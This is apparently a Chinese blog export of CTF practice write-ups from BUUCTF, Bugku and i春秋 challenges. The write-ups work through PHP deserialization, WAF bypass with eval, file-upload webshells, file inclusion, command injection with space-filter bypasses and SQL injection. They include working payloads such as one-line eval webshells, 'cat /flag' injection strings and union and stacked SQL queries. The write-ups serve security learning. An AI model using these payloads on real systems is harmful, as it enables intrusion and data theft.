[{"title":"序列化与反序列化","date":"2021-05-22T02:37:59.000Z","path":"2021/05/22/序列化与反序列化/","text":"序列和反序列化：简单来说： 序列化——将变量或对象转换成字符串的过程。 反序列化——将字符串转换成变量或对象的过程。 常见的魔术方法：1234567_construct()：创建对象时初始化_destruction()：结束时销毁对象_toString()：对象被当作字符串时使用_sleep()：序列化对象之前调用_wakeup()：反序列化对象之前调用_call()：调用对象不存在时使用_get()：调用私有属性时使用 常见的访问控制修饰符12345public(公有)protected(受保护)private(私有的)protected属性被序列化的时候属性值会变成：%00*%00属性名private属性被序列化的时候属性值会变成：%00类名%00属性名 借阅资料： https://blog.csdn.net/bmth666/article/details/104737025","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buuctf3","date":"2021-05-21T13:20:13.000Z","path":"2021/05/21/buuctf3/","text":"[护网杯 2018]easy_tornado[极客大挑战 2019]Http查看源码： 访问Secret.php 这题应该是伪造HTTP协议，burp抓包，伪造Referer： 他要求我们用Syclover，伪造User-Agent： 他又要求只能本地访问，伪造X-Forwarded-For： [极客大挑战 2019]PHP打开容器： 发现这样一句话，猜测应该是备份文件泄露，用dirsearch扫描一下，但是这个网址的服务器可能做得不大好会扫崩，所以我们来手工测试一下。尝试www.zip：![image-20210522105338750](buuctf3.assets/image-20210522105338750.png) 查阅有发现就两个文件有用： class.php： 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpinclude &#x27;flag.php&#x27;;error_reporting(0);class Name&#123; private $username = &#x27;nonono&#x27;; private $password = &#x27;yesyes&#x27;; public function __construct($username,$password)&#123; $this-&gt;username = $username; $this-&gt;password = $password; &#125; function __wakeup()&#123; $this-&gt;username = &#x27;guest&#x27;; &#125; function __destruct()&#123; if ($this-&gt;password != 100) &#123; echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;; echo &quot;You name is: &quot;; echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;; echo &quot;You password is: &quot;; echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;; die(); &#125; if ($this-&gt;username === &#x27;admin&#x27;) &#123; global $flag; echo $flag; &#125;else&#123; echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;; die(); &#125; &#125;&#125;?&gt; index.php: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;!DOCTYPE html&gt;&lt;head&gt; &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt; &lt;title&gt;I have a cat!&lt;&#x2F;title&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;meyer-reset&#x2F;2.0&#x2F;reset.min.css&quot;&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;style.css&quot;&gt;&lt;&#x2F;head&gt;&lt;style&gt; #login&#123; position: absolute; top: 50%; left:50%; margin: -150px 0 0 -150px; width: 300px; height: 300px; &#125; h4&#123; font-size: 2em; margin: 0.67em 0; &#125;&lt;&#x2F;style&gt;&lt;body&gt;&lt;div id&#x3D;&quot;world&quot;&gt; &lt;div style&#x3D;&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 85%;left: 440px;font-family:KaiTi;&quot;&gt;因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯 &lt;&#x2F;div&gt; &lt;div style&#x3D;&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 80%;left: 700px;font-family:KaiTi;&quot;&gt;不愧是我！！！ &lt;&#x2F;div&gt; &lt;div style&#x3D;&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 70%;left: 640px;font-family:KaiTi;&quot;&gt; &lt;?php include &#39;class.php&#39;; $select &#x3D; $_GET[&#39;select&#39;]; $res&#x3D;unserialize(@$select); ?&gt; &lt;&#x2F;div&gt; &lt;div style&#x3D;&quot;position: absolute;bottom: 5%;width: 99%;&quot;&gt;&lt;p align&#x3D;&quot;center&quot; style&#x3D;&quot;font:italic 15px Georgia,serif;color:white;&quot;&gt; Syclover @ cl4y&lt;&#x2F;p&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;script src&#x3D;&#39;http:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;three.js&#x2F;r70&#x2F;three.min.js&#39;&gt;&lt;&#x2F;script&gt;&lt;script src&#x3D;&#39;http:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;gsap&#x2F;1.16.1&#x2F;TweenMax.min.js&#39;&gt;&lt;&#x2F;script&gt;&lt;script src&#x3D;&#39;https:&#x2F;&#x2F;s3-us-west-2.amazonaws.com&#x2F;s.cdpn.io&#x2F;264161&#x2F;OrbitControls.js&#39;&gt;&lt;&#x2F;script&gt;&lt;script src&#x3D;&#39;https:&#x2F;&#x2F;s3-us-west-2.amazonaws.com&#x2F;s.cdpn.io&#x2F;264161&#x2F;Cat.js&#39;&gt;&lt;&#x2F;script&gt;&lt;script src&#x3D;&quot;index.js&quot;&gt;&lt;&#x2F;script&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 其中关键的代码段： 12345&lt;?phpinclude &#x27;class.php&#x27;;$select = $_GET[&#x27;select&#x27;];$res=unserialize(@$select);?&gt; 至此，我们可以知道这是一道反序列化题，当username=admin，password=100时输出flag。但是这里有个麻烦，__wakeup()魔术方法会在反序列化前跳出来执行，也就是username被赋值guest，就破坏了输出flag的条件，因此我们要想办法绕过__wakeup()魔术方法：在反序列化字符串时，属性个数的值大于实际属性个数时，会跳过 __wakeup()函数的执行。 我们尝试构造payload： ?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125; 这里要注意：由于这里的username和password属于private变量（private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。），因此在序列化的时候会在字段名前面增加所属类名，并且类名和字段名前要加前缀0。 [RoarCTF 2019]Easy Calc打开容器，发现这是一个计算机，查看一下源码： 现在我们知道服务器端存在一个WAF； 我们先访问一下calc.php： 我们看到他过滤了一些符号，同时利用num传参 这里我们要引入一个新的知识点：利用PHP的字符串解析特性Bypass我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。 例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)；其中%20被删除[被下划线替换。 如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过： /news.php?%20news[id%00=a 因为此时的变量名是%20new[id，而WAF识别的变量名是new_id，当php解析时会将%20和[删去，将%20news[id%00的值将存储到$_GET[“news_id”]中。 PHP的字符串解析对部分字符的操作： 符号 操作 . 下划线替换 [ 下划线替换 %20（ ） 删除 + 删除 我们看到由于存在eval()函数，因此存在eval()代码执行漏洞： PHP函数：🌸scandir()：以数组形式返回指定目录中的文件和目录🌸var_dump()：输出变量的相关信息。显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。🌸file_get_contents()：把整个文件读入一个字符串中。 总结:我们通过PHP的字符串解析特性绕过防火墙，利用eval()代码执行漏洞获取flag 构造paylaod： 扫描服务器根目录下文件：calc.php? num=var_dump(scandir(chr(47))) 获取flagg文件的内容：calc.php? num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) ？疑问：为什么calc.php?+num=var_dump(system(chr(96).chr(108).chr(115).chr(96)))无法获取服务器底下目录 参考资料： https://www.icode9.com/content-4-703121.html https://www.freebuf.com/articles/web/213359.html","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"做题思路","date":"2021-05-13T11:30:19.000Z","path":"2021/05/13/web做题思路/","text":"常见的备份文件后缀： .index.php.swpindex.php.swpindex.php.bak.index.php~index.php.bak_Edietplusindex.php.~index.php.1index.phpindex.php~index.php.rarindex.php.zipindex.php.7zindex.php.tar.gz.index.php.swowww.rarwww.zipwww.7zwww.tar.gzwww.tarweb.zipweb.rarweb.7zweb.tar.gzweb.tarwwwroot.rarweb.rar","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"i春秋","date":"2021-04-29T02:17:47.000Z","path":"2021/04/29/i春秋2/","text":"2017第二届广东省强网杯线上赛broken——（jsfuck）打开容器： 点开文件： 发现全是这样的乱码，查阅资料发现这是一种jsfuck编码：JSFuck 可以让你只用 6 个字符[ ] ( ) ! +来编写 JavaScript 程序。 我们赋值这段字符串，贴在控制台 点击&#123;&#125;美化表达式，运行发现报错，对比一下表达式，发现第一行的[没有对应]匹配，我们把它加上，页面弹出一个窗口 我们猜测弹出这个窗口的源码或为alert(‘flag is not here’)，把这段源码jsfuck编码，发现其长度也不过26806，而上面jsfuck表达式的长度有127763，说明这其中还有别的代码，而flag很有可能藏在其中，那么我们接下来就想怎么能获得源码呢？ 查看了wp他是说把结尾的()删去，再补个]，同时把刚开始时补的]删去 解释是该段代码最后()代表的是函数的结尾，所以只要把最后这个括号删掉就不会弹框了 1","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"i春秋","date":"2021-04-19T14:25:33.000Z","path":"2021/04/19/i春秋1/","text":"第三届“百越杯”福建省高校网络空间安全大赛（upload文件上传漏洞）打开题目地址发现是一道文件上传题，尝试上传一个shell内容，jpg后缀的文件，发现上传成功，说明不检查文件内容 再上传一次，burp抓包，修改后缀jpg为php，发现也上传成功 用蚁剑连接 没有直接给我们flag，那么可能”藏“起来了 在虚拟终端上寻找，也找不到 然后我以为flag被删了，看了大佬的博客才知道，config文件里面有内容 于是我们在蚁剑的主页选择数据操作，添加数据库，连接用户和连接密码时刚刚配置文件的内容 其实感觉能猜到config里面有东西还是蛮神奇的，可能是config文件是配置文件的原因，所以会下意识的去那里找线索。 “百度杯”CTF比赛 九月场（文件上传漏洞）我们先上传一个shell内容，jpg后缀的文件，发现上传成功，说明不检查文件内容。然后在上传上传一次，burp拦截修改后缀为php，也上传成功。但是他并没有直接告诉我们他上传的位置，我们查看源码可以看到 点击进入网页 我们都知道，按理来说这里不应该显出源码的，那么对比说明这里过滤了&lt;? 和php 我们可以尝试换标签（如&lt;script&gt;）来绕过&lt;?过滤 通过大小写来绕过php过滤 法1：构造一个内容为： 1&lt;script language&#x3D;&quot;pHp&quot;&gt;@eval($_POST[&#39;pass&#39;]);&lt;&#x2F;script&gt; 后缀为jsp的文件，上传，蚁剑连接 法2：https://blog.csdn.net/ITmincherry/article/details/102531096 “百度杯”CTF比赛 2017 二月场（文件包含漏洞）我们看到这是一道文件包含漏洞题： 我们会想到利用PHP的输入流php://input 我们看到有一个文件名比较奇特，用PHP://filter读取dle345aae.php文件 再base64解码得 “百度杯”CTF比赛 九月场——123打开容器，发现一个登入框，还以为是sql注入，尝试了一下发现都是报错，查看源码： 然后查看user.php，但是发现网页里面什么也没有，源码也是 于是我用御剑扫了一下端口，发现有一个flag.php的文件，但是点景区，发现被骗了，是假的。 于是看了大佬的提示，这里应该查看user.php的备份文件user.php.bak，属于备份隐私泄露 下载下来，里面都是用户名，根据login.php源码的提示，密码由用户名+生日年份构成 尝试burp爆破： 设定两个参数，然后更改攻击模式为battering ram，即对两个参数同时爆破，且payload相同 我们猜测这么多用户里面应该会有人是1995年出生的，然后爆破出 用爆破出的用户名密码登入，页面什么内容也没有，查看源码发现： F12进入开发者模式将注释符都删掉，得到一个上传框，上传一句话木马文件， 上传后缀jpg的一句话木马 这就有点奇怪了，为什么明明已经是白名单的后缀了，文件名还是不合法 尝试利用Apache的后缀解析 删去一句话木马 打开/view.php网页 传参：?file=1 过滤了flag，尝试双写绕过 SP: burp的几种攻击模式：https://blog.csdn.net/qq_39101049/article/details/90234669","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buuctf2","date":"2021-04-13T10:42:02.000Z","path":"2021/04/13/buuctf2/","text":"[极客大挑战 2019]LoveSQL这关之前有做过类似的，但是这个应该是升级版 进过尝试可知注入类型为单引号注入，用万能密码尝试登入 发现这次flag不在里面了，那我们尝试一下获取他的数据库信息 法1： union联合注入 确认返回字段数：1&#39; union select 1,2,3# 爆库：1&#39; union select 1,2,database()# 爆表：1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;geek&#39;# 爆列：1&#39; union select 1,2,group_cooncat(columns) from information_schema.columns where table_name=&#39;geekuser&#39;# 爆值：1&#39; union select 1,2,group_concat(username,password) from geekuser# 发现该表下只有一行数据：id=1,username=admin,password=“字符串” 于是我们再查一下l0ve1ysq1表——1&#39; union select 1,2,group_concat(username,password) from l0ve1ysq1# 法2： 报错注入： 由于输入1&#39; 会返回报错信息，尝试报错注入： 爆库：1&#39; or extractvalue(1,concat(&#39;#&#39;,database()))# 爆表：1&#39; or extractvalue(1,concat(&#39;#&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;geek&#39;)))# 爆列：1&#39; or extractvalue(1,concat(&#39;#&#39;,(select group_concat(column_name) from information_schema.columns where table_name=&#39;geekuser&#39;)))# 爆值：1&#39; or extractvalue(1,concat(&#39;#&#39;,(select password from geekuser where id=1)))# 发现返回一串字符串，但是flag不在其中，查看另一个表 1&#39; or extractvalue(1,concat(&#39;#&#39;,(select password from l0ve1ysq1 where id=1)))# 发现由于报错注入的返回长度的限制，后续的值没有全部回显在页面上，因此要用substr函数去截，还挺麻烦的，后续的就不写了。 [ACTF2020 新生赛]BackupFile（文件备份+弱口令绕过）打开容器发现什么也没有，查看源码也没有，御剑扫描也没有，看到题目提示备份文件，联想到之前有做过以.bak为后缀的备份文件的题 打开文件发现一段源码 1234567891011121314151617&lt;?phpinclude_once &quot;flag.php&quot;;if(isset($_GET[&#x27;key&#x27;])) &#123; $key = $_GET[&#x27;key&#x27;]; if(!is_numeric($key)) &#123; exit(&quot;Just num!&quot;); &#125; $key = intval($key); $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;; if($key == $str) &#123; echo $flag; &#125;&#125;else &#123; echo &quot;Try to find out source file!&quot;;&#125; 代码审计：将get的值赋给参数key，先判断key是否为数字，不是则退出，是则通过intval获取参数中的整数部分，然后和变量str的值进行对比，相等则输出flag。 sp： 由于php弱口令的特性，字符串和数字比较使用==时,字符串会先转换为数字类型再比较 var_dump(‘a’ == 0);//true ——此时a字符串类型转化成数字，因为a字符串开头中没有找到数字，所以转换为0var_dump(‘123a’ == 123);//true ——这里’123a’会被转换为123 php中有这样一个规定：字符串的开始部分决定了它的值，如果该字符串以合法的数字开始，则使用该数字至和它连续的最后一个数字结束，否则其比较时整体值为0。举例： var_dump(‘a123’ == 123);//false var_dump(‘1233a’ == 123);//false var_dump(‘123a1’ == 123);//true 因此这里我们只需要构造payload：?key=123即可 [极客大挑战 2019]BuyFlag点开容器，进入PAYFLAG页面，查看源码： 我们需要上传money和password，根据网页提示money=100000000，password=404a绕过is_numeric和php弱口令相等 没什么内容，抓包试试 修改user的值为student，但是这样也不行，那改成1： 太长了，尝试改用科学计数法","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"PHP伪协议","date":"2021-04-08T08:27:15.000Z","path":"2021/04/08/PHP伪协议/","text":"","tags":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"}]},{"title":"bugukuu2","date":"2021-04-07T14:50:37.000Z","path":"2021/04/07/bugku2/","text":"web25 web26（伪造Referer） 我们知道Referer可以伪造的，burp抓包，添加语句：Referer: http://www.google.com 获得flag web27 web28：（伪造X-Forwarded-For）这题就是伪造X-Forwarded-For不多说了 web29 web30：（猜测 || php:input利用||file_get_contents() 函数绕过）题目说txt，什么用呢先记着 打开题目地址，看见源码 新函数： extract() 函数 功能： 从数组中将变量导入到当前的符号表 语法：extract(array,extract_rules,prefix) 参数 描述 array 必需。规定要使用的数组。 extract_rules 可选。extract() 函数将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。对不合法和冲突的键名的处理将根据此参数决定。 可能的值： EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。 EXTR_SKIP - 如果有冲突，不覆盖已有的变量。 EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 prefix。 EXTR_PREFIX_ALL - 给所有变量名加上前缀 prefix。 EXTR_PREFIX_INVALID - 仅在不合法或数字变量名前加上前缀 prefix。 EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。 EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。 EXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。 prefix 可选。请注意 prefix 仅在 extract_type 的值是 EXTR_PREFIX_SAME，EXTR_PREFIX_ALL，EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS 时需要。如果附加了前缀后的结果不是合法的变量名，将不会导入到符号表中。 前缀和数组键名之间会自动加上一个下划线。 file_get_contents() 函数 功能：把整个文件读入一个字符串中 语法：file_get_contents(path,include_path,context,start,max_length) 参数 描述 path 必需。规定要读取的文件。 include_path 可选。如果您还想在 include_path（在 php.ini 中）中搜索文件的话，请设置该参数为 ‘1’。 context 可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。若使用 NULL，则忽略。 start 可选。规定在文件中开始读取的位置。该参数是 PHP 5.1 中新增的。 max_length 可选。规定读取的字节数。该参数是 PHP 5.1 中新增的。 代码审计：通过get的方式获取$ac和$fn，file_get_contents() 函数读取文件内容，然后赋值给$f，当$f=$ac时输出flag 法1：由于题目提到一个后缀txt，猜测存在文件名flag.txt，访问，果然存在 构造payload：?ac=bugku&amp;fn=flag.txt 法2：利用php伪协议php://input 当传入的参数值作为文件名打开时，可以将参数值设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。 web31：（御剑扫描+burp暴力破解）刚打开题目地址还以为网络崩了，刷了几次还是一样，那应该就是题目页面了，查看一下源码，没东西，蚁剑扫一下 发现有一个robots.txt，点进去看一下 打开resusl.php 发现这里通过GET方式获取参数x，当x的值等password时应该就会跳出flag了，尝试爆破 web32神仙题，没看源码做个鬼 web34：（upload+一句话木马）打开题目地址，页面上没什么东西，查看源码： 点开upload.php 尝试一句话木马，然后发现它设立了一个白名单，看起来不好绕了 上传图片马，访问上传地址： 我们看到看来服务器过滤了&lt;?php和?&gt; 法1：我们创建一个新文件，后缀jpg，内容&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;cmd&#39;]); &lt;/script&gt;上传，访问发现一片空白，说明被当做php代码执行了，蚁剑连接，终端寻找 法2：我们创建一个新文件，后缀jpg，内容&lt;script language=&quot;php&quot;&gt;system(&quot;find / -name flag*&quot;); &lt;/script&gt; 访问上传地址 直接?flie=/flag ， flag就出来了 然后我自己修改了一下文件内容：&lt;script language=&quot;php&quot;&gt;system(&quot;cat /flag&quot;); &lt;/script&gt; 访问上传地址 web35：（反序列化）点开题目地址 第一眼看还以为是一道sql注入题，结果发现login点不动。查看源码 点击 尝试传输：?25603 我们看到当cookie的值反序列化后等于key的值时会输出flag，于是我们自然想到将key的值先序列化后赋值给cookie php在线工具：https://c.runoob.com/compile/1 构造payload:Cookie: BUGKU=s:13:&quot;ctf.bugku.com&quot;","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buuctf","date":"2021-04-05T12:29:14.000Z","path":"2021/04/05/buuctf1/","text":"[ACTF2020 新生赛]Include点开容器，发现 点击tips 发现是用文件包含的方式打开flag.php文件 之前刷题有做过用php://filter读取文件源码，这题试一下 用base64-decode 12345678910111213&lt;meta charset=&quot;utf8&quot;&gt;&lt;?phperror_reporting(0);$file = $_GET[&quot;file&quot;];if(stristr($file,&quot;php://input&quot;) || stristr($file,&quot;zip://&quot;) || stristr($file,&quot;phar://&quot;) || stristr($file,&quot;data:&quot;))&#123; exit(&#x27;hacker!&#x27;);&#125;if($file)&#123; include($file);&#125;else&#123; echo &#x27;&lt;a href=&quot;?file=flag.php&quot;&gt;tips&lt;/a&gt;&#x27;;&#125;?&gt; index.php里没内容，看一下flag.php里的 用base64-decode 1234&lt;?phpecho &quot;Can you find out the flag?&quot;;//flag&#123;ce69e052-72a5-4f31-b4f7-d618aa394082&#125;?&gt; [极客大挑战 2019]Secret File点开容器，发现什么也没有，用御剑跑了一下，发现容易服务器崩，线程少又跑的慢，点击查看源码 点开箭头所指链接 点开箭头所指链接，发现会302跳转到end.php说明这里面有猫腻 burp抓包，发送到Repeater 访问secr3t.php，得一段代码： 123456789101112131415&lt;html&gt; &lt;title&gt;secret&lt;/title&gt; &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;?php highlight_file(__FILE__); error_reporting(0); $file=$_GET[&#x27;file&#x27;]; if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123; echo &quot;Oh no!&quot;; exit(); &#125; include($file); //flag放在了flag.php里?&gt;&lt;/html&gt; 这里进行下一步的时候我放了一个错误，我知道要用php://filter读取flag文件，但是错误的在index.php后传参的， 也就是：http://c76e7818-4c78-4212-841b-f65037874e73.node3.buuoj.cn/?file=php://filter/convert.base64-encode/resource=flag.php 这样是错误的，因为index.php没有文件包含， 因此我们要改成：http://c76e7818-4c78-4212-841b-f65037874e73.node3.buuoj.cn/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php 对箭号所指的字符串base64解码： 12345678910111213141516171819&lt;html&gt;&lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;title&gt;FLAG&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body style&#x3D;&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;h1 style&#x3D;&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;ååï¼ä½ æ¾å°æäºï¼å¯æ¯ä½ çä¸å°æQAQ~~~&lt;&#x2F;h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;p style&#x3D;&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt; &lt;?php echo &quot;æå°±å¨è¿é&quot;; $flag &#x3D; &#39;flag&#123;c2a2c0e2-6076-4c2a-a387-f45b291c0978&#125;&#39;; $secret &#x3D; &#39;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#39; ?&gt; &lt;&#x2F;p&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 得flag [ACTF2020 新生赛]Exec点开容器，发现一个ping窗口 ping一下容器地址 回顾一下系统命令的管道符 1、|（就是按位或），直接执行|后面的语句 2、||（就是逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句 3、&amp;（就是按位与），&amp;前面和后面命令都要执行，无论前面真假 4、&amp;&amp;（就是逻辑与），如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令 5、; 前后都执行，无论前面真假，同&amp;，（linux也有） ping: f91eb079-6b2c-4052-8575-0021fe980c34.node3.buuoj.cn |ls——查看当前目录下的文件 看来flag不在当前目录下 ping: f91eb079-6b2c-4052-8575-0021fe980c34.node3.buuoj.cn |ls /——查看根目录下的文件 我们看到在根目录下存在一个名为flag的文件 ping：f91eb079-6b2c-4052-8575-0021fe980c34.node3.buuoj.cn | cat /flag 得flag [GXYCTF2019]Ping Ping Ping点开容器 直接开始ping 发现不能payload里面不能有空格 补充一个知识点（命令执行空格绕过）： &lt; &lt;&gt; &gt; 重定向符 %09(需要php环境) $&#123;IFS&#125; $IFS$9 &#123;cat,flag.php&#125; //用逗号实现了空格功能 %20 那么我们尝试用重定向符绕过 发现部分符号也被禁用了， 那么我们尝试用$IFS$9绕过，绕过成功，尝试cat flag 发现flag都被禁了，那我们cat index.php，得一段代码： 12345678910111213141516171819&lt;?phpif(isset($_GET[&#x27;ip&#x27;]))&#123; $ip = $_GET[&#x27;ip&#x27;]; if(preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;1f&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match))&#123; echo preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;20&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match); die(&quot;fxck your symbol!&quot;); &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123; die(&quot;fxck your space!&quot;); &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123; die(&quot;fxck your bash!&quot;); &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123; die(&quot;fxck your flag!&quot;); &#125; $a = shell_exec(&quot;ping -c 4 &quot;.$ip); echo &quot;&lt;pre&gt;&quot;; print_r($a);&#125;?&gt; 我们可以看到它禁用了很多的符号，这边要注意它严格过滤了flag——只要字符串中有按顺序存在f l a g就会被警告 法1：由于存在shell_exec，我们可以尝试设参，如构造payload：?ip=127.0.0.1;m=ag;n=fl;cat$IFS$9$n$m.php 这句话其实在终端就执行了两句话，一个是ping端口127.0.0.1，另一个是执行cat flag.php文件。中间两句是设置变量赋值。 法2：内联执行 反引号在linux中作为内联执行，执行输出结果。也就是说 cat ```ls` ``——先执行ls，输出 index.php 和 flag.php 。然后再执行 cat index.php;cat flag.php 这样查看返回页面的源码，得： 参考： 命令执行绕过：https://www.dazhuanlan.com/2019/12/09/5dee4883dad99/ https://www.cnblogs.com/NPFS/p/13279815.html wp：https://blog.csdn.net/vanarrow/article/details/108295481 https://blog.csdn.net/qq_46184013/article/details/107061110?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-1.control&amp;dist_request_id=1328767.72324.16177154446992417&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-1.control [极客大挑战 2019]Knife点开容器，发现直接给了我们一句话木马 我们用蚁剑连接，密码Syc 点击虚拟终端，cat /flag [强网杯 2019]随便注：（sql堆叠注入+数据库语句的使用）点开容器 是一道sql注入题，先拿sqlmap跑一下，发现跑不出来。那就手工注入吧 猜注入类型：0&#39; or 1=1# 查询有结果 ​ 0&#39; or 1=2#查询无结果 猜字段：1&#39; order by 2# 查询有结果 ​ 1&#39; order by 3# 查询无结果 查看返回值：1&#39; union select 1,2# 发现它使用正则匹配过滤掉了很多词，尝试一下堆叠注入。 爆库：payload：1&#39;;show databases# 爆表：payload：1&#39;;show tables# 这里其实有个疑惑，就是我们查表没指明库，不应该跳出所有的表吗？但是他跳出来的是supersqli库里的表？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？ 爆列：payload：1’; show columns from `1919810931114514`# sp:当字符串为表名，引用时要加反单引号 1919810931114514表中只有flag一列，由此看来，1919810931114514不是默认表，访问一下words表——1&#39;; show columns from words# words表中含有data和id两个列。那么我们可以猜测数据库中的查询语句可能是select id,data from words where id= 而我们的目标是获取列flag的值 法1：由于我们看到数据库默认的表是words，那么我们可以尝试改造`1919810931114514 `——将words表名改为words1，1919810931114514改为words，然后将列名flag改为id，最后在构造0&#39; or 1=1#即可 payload：1&#39;;rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100);desc words# 我们看到原列名flag被改为了id，然后payload:0&#39; or 1=1# 法2： MySQL数据库中还可以使用handler查询内容： HANDLER table_name OPEN——打开一张表，无返回结果，HANDLER table_name READ FIRST——获取数据表第一行，通过将 READ FIRST改成READ NEXT依次获取其它行。有点类似于指针。HANDLER table_name CLOSE——来关闭打开的表。 索引去查看的话要按上述一定的顺序，获取表中的数据： HANDLER table_name READ index_name FIRST——获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。 索引列指定一个值，可以指定从哪一行开始： HANDLER table_name READ index_name = value——指定从哪一行开始，通过NEXT继续浏览。 因此，我们构造payload：0’;handler `1919810931114514` open;handler `1919810931114514` read first# [SUCTF 2019]EasySQL：（sql堆叠注入）一道post型sql注入题，sqlmap跑一下，发现跑不出来 手工注入： 1’ 没有回显，可能屏蔽了回显报错，那么报错注入肯定不可能了 1’ or 1=1# 1‘ and 1=1#也一样，应该是and和or被过滤了 尝试联合注入：1’ union select 1,2# 查询框中单独输入select没有回显，输入union 看来union被过滤了，尝试盲注，先输一个sleep，同样不让，那么盲注也不行了 试试堆叠注入： 试了半天的1’;show databases#都没回显，然后payload改成1;show databases# 才发现这题是数字型注入 1;show tables;# 1;desc flag# 刚开始我还以为他过滤了desc，结果单输flag发现原来是过滤了flag 那么做到现在我们先整理一下思路—— 1.当我们输入任意数字，回显都是1 而当输入非数字内容时，则无回显 2.由于过滤了，那么查询语句中肯定有固定的Flag 